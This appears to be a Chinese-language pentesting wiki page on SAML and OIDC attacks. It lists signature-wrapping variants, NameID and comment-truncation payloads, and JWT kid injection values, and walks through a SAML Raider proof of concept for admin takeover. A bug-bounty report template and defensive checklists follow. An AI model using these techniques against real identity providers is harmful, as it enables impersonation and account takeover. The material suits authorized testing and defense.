---
type: wiki
category: attack
tool: samlraider,burp,manual
status: active
last-updated: 2026-04-21
---

# SAML / OIDC 攻擊深度（2026 版）

> **用途：** SAML = 企業 SSO 主流，實作複雜 → 漏洞多。XML Signature Wrapping / assertion 驗證問題 = RCE-equivalent。OIDC 較新但 ID token 驗證不嚴也常中。**企業 target 必查**。

## 0. SAML 基礎

```
User → SP (Service Provider) → IdP (Identity Provider) → assertion → SP → granted
```

- SAMLRequest（SP → IdP）— Base64 + deflate
- SAMLResponse（IdP → SP）— Base64 XML + signature
- 關鍵 check: SP 驗 signature + audience + notOnOrAfter

## 1. SAML 攻擊

### 1.1 XML Signature Wrapping (XSW)

**核心：**`<Signature>` 簽的 XML 片段 ≠ SP 讀 attribute 的片段。

8 種 XSW 變體（Burp SAML Raider 全部支援）：

```
XSW1: 把舊 Assertion wrap 在 Response root，放新 Assertion 在其下
XSW2: 新 Assertion 放 Response 之前
XSW3: 複製 Assertion，原的被簽，新的在 Response root
XSW4: 新 Assertion 當 Response 的 child，wrap 舊簽過的 Assertion
XSW5: Assertion 裡包一個 copy
XSW6: Assertion 裡 wrap 在 Signature 下
XSW7: 用 Extensions element wrap
XSW8: 把 wrapping 放在 Object 下
```

### 1.2 Signature stripping

```
# 若 SP 沒強制檢查 signature 存在
# → 直接移除 <Signature> element
# → SP 仍接受 → 可改任意 attribute
```

### 1.3 Signature algorithm confusion

```
# IdP 用 RS256，SP 允許 HMAC
# → 攻擊者用 SP 公鑰當 HMAC secret
# → 產生 valid HMAC signature
```

類似 JWT alg=none / alg confusion。

### 1.4 XXE in SAML

SAML = XML → XXE 全適用。見 [75-xxe-deep.md](75-xxe-deep.md)。

### 1.5 Audience 不檢查

```
# 偷別的 SP 的 assertion → replay 到 target SP
# 若 target SP 不驗 <Audience> → 接受
```

### 1.6 NameID 注入

```xml
<!-- 合法 -->
<NameID>victim@target.com</NameID>

<!-- 攻擊 -->
<NameID>victim@target.com<!-- --></NameID>
<!-- 或 -->
<NameID>victim@target.com%00admin@target.com</NameID>
```

### 1.7 Comment truncation attack

```xml
<!-- 2018 Duo Security bypass -->
<NameID>victim@evil.com<!---->admin@target.com</NameID>
<!-- 某些 parser: 取 "victim@evil.com" -->
<!-- 某些 parser: 取 "admin@target.com" -->
```

### 1.8 Replay attack

```
# 沒 OneTimeUse / 沒記錄已用 assertion → 重複使用
```

### 1.9 SAMLRequest injection

```
# 改 AuthnRequest 中的 AssertionConsumerServiceURL
# → IdP 把 assertion 送到 attacker
# (若 IdP 沒固定 ACS URL)
```

### 1.10 IdP metadata injection

```
# 若 SP 接受 user-supplied IdP metadata → fake IdP
```

## 2. OIDC 攻擊

### 2.1 ID token alg=none

```json
{ "alg": "none" }
```

見 [31-jwt-cheatsheet.md](31-jwt-cheatsheet.md)。

### 2.2 alg confusion (RS256 → HS256)

用 public key 當 HMAC secret。

### 2.3 kid injection

```
# JWT header "kid": "../../../../dev/null"
# 或 "kid": "1 UNION SELECT ..." (SQLi)
```

### 2.4 redirect_uri bypass

見 [16-oauth-attack-chains.md](16-oauth-attack-chains.md)。

### 2.5 state / nonce missing

```
# 無 state → CSRF login
# 無 nonce → ID token replay
```

### 2.6 jwks_uri 信任

```
# Unverified discovery doc
# 若 SP fetch https://idp.example/.well-known/openid-configuration
# 並信 jwks_uri → 若 SSRF 可改 fetch source → attacker control jwks
```

### 2.7 JWKS key confusion

```
# 響應中有多個 kid
# 攻擊者指定 kid 的 key material → 可能被接受
```

### 2.8 Authorization code 重用

```
# code 應一次性 + 與 client_id + redirect_uri 綁定
# 若不綁 → 偷 code 可換 token
```

### 2.9 PKCE downgrade

```
# 攻擊者把 PKCE 參數移除
# 若 SP 不強制 → 回到 vulnerable flow
```

### 2.10 Client_secret 在前端

```
# 真實案例：SPA 把 client_secret 寫死在 JS
```

### 2.11 Public client + implicit flow

```
# implicit 已過時（2021 OAuth 2.1 移除）
# 若仍啟用 → token 直接在 URL fragment → XSS / referrer leak
```

## 3. 工具

### 3.1 SAML Raider (Burp extension)

```
# Burp → BApp Store → SAML Raider
# 攔截 SAMLResponse → 右鍵 → SAML Raider → 試 8 種 XSW
```

### 3.2 SSO Wall of Shame

https://sso.tax/ — 列有哪些 SaaS 把 SSO 收費（和漏洞無關但有歷史）

### 3.3 samldump / python3-saml

```bash
pip install python3-saml
# 手寫 XML manipulation
```

### 3.4 OAuth / OIDC 工具

```bash
# oidc-inspector
# jwt_tool
pip install jwt_tool
python3 jwt_tool.py -M at <target_url>
```

## 4. 實戰流程

### 4.1 找 SAML endpoint

```
/saml/acs                (Assertion Consumer Service)
/saml/login
/sso/saml
/_saml/acs
/auth/saml/callback
.well-known/saml-metadata
```

### 4.2 抓 SAMLResponse

```
# Burp 攔 POST to /saml/acs
# Body: SAMLResponse=<base64 encoded XML>
# Decode → 看 assertion 結構
```

### 4.3 測試 checklist

```
[ ] XSW1-8（用 SAML Raider）
[ ] Strip signature
[ ] 改 NameID
[ ] Comment truncation
[ ] Replay 舊 assertion
[ ] Audience 改成 attacker SP
[ ] XXE 在 assertion 中
[ ] NotOnOrAfter 過期是否檢查
[ ] 改 AttributeStatement（role=admin）
```

### 4.4 OIDC checklist

```
[ ] state / nonce 強制
[ ] redirect_uri exact match
[ ] code 一次性 + bound
[ ] PKCE 強制（public client）
[ ] ID token alg 固定
[ ] kid 處理安全
[ ] JWKS 不自動 fetch 外部
[ ] aud / iss / exp 驗證
```

## 5. 完整 PoC：SAML XSW → admin takeover

### Step 1: 正常流程

```
1. 登入 attacker 自己的帳號
2. Burp 攔 SAMLResponse
3. Decode base64
4. 看 <NameID>attacker@test.com</NameID>
5. 看 <AttributeValue>role=user</AttributeValue>
```

### Step 2: SAML Raider 試 XSW3

```
1. 右鍵 response → SAML Raider → XSW Attacks → XSW3
2. 改 NameID 為 admin@target.com
3. 改 role 為 admin
4. Forward
```

### Step 3: 觀察結果

```
若 SP 接受 → 登入為 admin
Response 302 to /admin/dashboard
```

### Step 4: 驗證

```bash
curl https://target.com/admin/api/users \
  -b "session=$NEW_COOKIE"
# → 列全部 user
```

### Step 5: 報告

```markdown
## 漏洞概述
https://target.com/saml/acs 使用的 SAML validator 存在 XML Signature
Wrapping (XSW) 漏洞（變體 XSW3）。攻擊者可複製並修改 Assertion，在保
留原始簽名有效性的同時讓 SP 讀取被竄改的 NameID 與 AttributeStatement，
允許 impersonate 任意使用者（含 admin）達成完整帳號接管。

## PoC
[原始 SAMLResponse + XSW3 修改後 XML + forward 結果 + /admin 存取]

## Impact
- 任意 user impersonation（需知道 target NameID，通常是 email / username）
- 完整系統 admin takeover
- Bypass 所有 SAML-based access control

## Severity
P1 / Critical

## 修補
1. 升級 SAML library 到 2018+ 版本（多數已修 XSW）
2. 驗證時用 strict XML canonicalization
3. 禁用 SAML comment（或用 c14n 消除 comment）
4. 驗 signature 後用 ID-based lookup，不 XPath
5. 考慮改用 OIDC（較新 spec 攻擊面小）
```

## 6. 防禦 checklist

```
SAML:
1. 使用 well-maintained library（Shibboleth, SimpleSAMLphp, passport-saml 最新）
2. 驗 signature 後用 reference-by-ID 拿 data，不 XPath
3. <Audience> 嚴格檢查
4. <NotOnOrAfter> 強制
5. OneTimeUse 或 server-side seen-ID set
6. 禁用 DOCTYPE（XXE）
7. 測 XSW 1-8（Raider）

OIDC:
1. state + nonce 強制
2. PKCE 強制（所有 client）
3. redirect_uri exact match
4. ID token alg lock + kid whitelist
5. jwks_uri 快取 + 不盲 fetch
6. code 一次性 + client binding
7. 不用 implicit flow
```

## 關聯文件

- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) — OAuth redirect_uri bypass
- [31-jwt-cheatsheet.md](31-jwt-cheatsheet.md) — JWT alg confusion
- [75-xxe-deep.md](75-xxe-deep.md) — SAML 中的 XXE
- SAML Raider：https://github.com/CompassSecurity/SAMLRaider
- PortSwigger SAML：https://portswigger.net/web-security/saml
- SSO Wall of Shame：https://sso.tax/
- Duo XSW research：https://duo.com/labs/research/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
